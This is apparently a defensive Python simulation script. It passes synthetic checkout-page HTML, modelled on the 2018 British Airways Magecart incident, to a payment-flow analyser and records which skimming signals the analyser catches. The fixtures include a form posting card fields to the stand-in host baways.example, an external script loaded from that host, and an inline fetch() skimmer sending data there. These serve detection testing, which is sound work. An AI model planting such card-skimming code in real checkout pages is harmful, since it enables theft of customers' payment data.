"""Safe, offline simulation of selected British Airways 2018 Magecart-style signals.

This script does not contact any host, submit a form, or use real payment data.
All attacker-controlled destinations use the reserved .example TLD.
Run from the repository root:
    python incident_simulation_ba2018.py

The scenarios exercise the repository's existing bankshield_core.analyze_payment_flow
logic using synthetic HTML and a tiny mock response object.
"""
from __future__ import annotations

import json
from pathlib import Path
from types import SimpleNamespace

from bankshield_core import analyze_payment_flow, load_processor_map

ROOT = Path(__file__).resolve().parent
PROCESSOR_REGISTRY = ROOT / "data" / "processors.json"
OUTPUT_PATH = ROOT / "results" / "incident_simulations" / "ba2018_pfiv_simulation_results.json"

load_processor_map(str(PROCESSOR_REGISTRY))


def _response(url: str):
    """Minimal response-shaped object; no HTTP client or network is used."""
    return SimpleNamespace(url=url, status_code=200, headers={}, history=[])


def _analyse(scenario_id: str, title: str, url: str, html: str, note: str) -> dict:
    result = analyze_payment_flow(_response(url), html)
    evidence_text = " ".join(result.get("evidence", []))
    return {
        "scenario_id": scenario_id,
        "scenario": title,
        "note": note,
        "observed_pfiv_status": result.get("status"),
        "pfiv_score": result.get("score"),
        "processor": result.get("processor"),
        "processor_consistency": result.get("processor_consistency"),
        "external_payment_endpoints": result.get("external_endpoints", []),
        "intermediary_domains": result.get("intermediate_domains", []),
        "script_domains": result.get("page", {}).get("script_domains", []),
        "evidence": result.get("evidence", []),
        "static_pfiv_mentions_baways": "baways.example" in evidence_text.lower(),
    }


def run_simulation(write_json: bool = True) -> dict:
    """Run four deterministic fixtures against the real PFIV analysis function."""
    merchant_url = "https://merchant.example/checkout"

    legitimate_processor_html = """
    <!doctype html><html><head><title>Stripe secure checkout</title></head>
    <body><h1>Stripe payment</h1><p>Complete your payment securely with Stripe.</p>
    <form method="post" action="https://api.stripe.com/v1/checkout/sessions">
      <input name="card_number" autocomplete="cc-number">
      <input name="cvv" autocomplete="cc-csc">
      <button type="submit">Pay now</button>
    </form></body></html>
    """

    visible_exfil_endpoint_html = """
    <!doctype html><html><head><title>Merchant checkout</title></head>
    <body><h1>Complete payment</h1>
    <form method="post" action="https://baways.example/collect">
      <input name="card_number"><input name="cvv">
      <button type="submit">Pay now</button>
    </form></body></html>
    """

    external_script_html = """
    <!doctype html><html><head><title>Merchant checkout</title>
    <script src="https://baways.example/modernizr.js"></script></head>
    <body><h1>Complete payment</h1>
    <form method="post" action="/payment/submit">
      <input name="card_number"><input name="cvv">
      <button type="submit">Pay now</button>
    </form></body></html>
    """

    inline_script_exfil_html = """
    <!doctype html><html><head><title>Merchant checkout</title>
    <script>
      // Synthetic demonstration only: no script is executed.
      // The current static parser does not inspect inline JS request destinations.
      function syntheticSkimmer() {
        fetch('https://baways.example/collect', {method: 'POST', body: 'DUMMY_ONLY'});
      }
    </script></head><body><h1>Complete payment</h1>
    <form method="post" action="/payment/submit">
      <input name="card_number"><input name="cvv">
      <button type="submit">Pay now</button>
    </form></body></html>
    """

    cases = [
        _analyse(
            "legitimate_processor_control",
            "Legitimate control: visible Stripe payment endpoint",
            merchant_url,
            legitimate_processor_html,
            "Control case. Expected to be Verified because the static form endpoint maps to the claimed Stripe processor.",
        ),
        _analyse(
            "visible_attacker_form_endpoint",
            "Visible endpoint diversion: payment form posts to a synthetic attacker domain",
            merchant_url,
            visible_exfil_endpoint_html,
            "Reduced attack case. The external destination is directly visible in the form action.",
        ),
        _analyse(
            "external_skimmer_script",
            "External script indicator: payment form loads a synthetic third-party script",
            merchant_url,
            external_script_html,
            "Reduced attack case. The third-party script host is visible in a script src attribute; this is a review signal, not proof that the script is malicious.",
        ),
        _analyse(
            "inline_javascript_skimmer",
            "Inline JavaScript skimmer: exfiltration URL exists only inside inline script text",
            merchant_url,
            inline_script_exfil_html,
            "Blind-spot case. The HTML contains a synthetic inline fetch destination, but the current parser does not extract inline JavaScript network calls.",
        ),
    ]

    report = {
        "title": "British Airways 2018 incident — safe PFIV signal simulation",
        "method": "Offline static-HTML fixtures passed to the existing analyze_payment_flow function",
        "network_requests": 0,
        "payment_form_submissions": 0,
        "real_credentials_or_card_data_used": False,
        "reserved_attacker_domain": "baways.example",
        "cases": cases,
        "interpretation": [
            "The visible attacker form endpoint case should be classified Suspicious by endpoint and unexpected-domain evidence.",
            "The external script source case should produce a Needs Review signal when its host is visible in static HTML.",
            "The inline JavaScript case demonstrates a visibility gap: the app may return a generic Needs Review state, but the inline exfiltration destination is not identified in PFIV evidence.",
            "This is a scaled-down logic simulation, not a replay of the real British Airways infrastructure or a real-world detection-rate measurement.",
        ],
    }

    if write_json:
        OUTPUT_PATH.parent.mkdir(parents=True, exist_ok=True)
        OUTPUT_PATH.write_text(json.dumps(report, indent=2), encoding="utf-8")
        report["output_file"] = str(OUTPUT_PATH.relative_to(ROOT))
    return report


if __name__ == "__main__":
    report = run_simulation(write_json=True)
    print(json.dumps(report, indent=2))
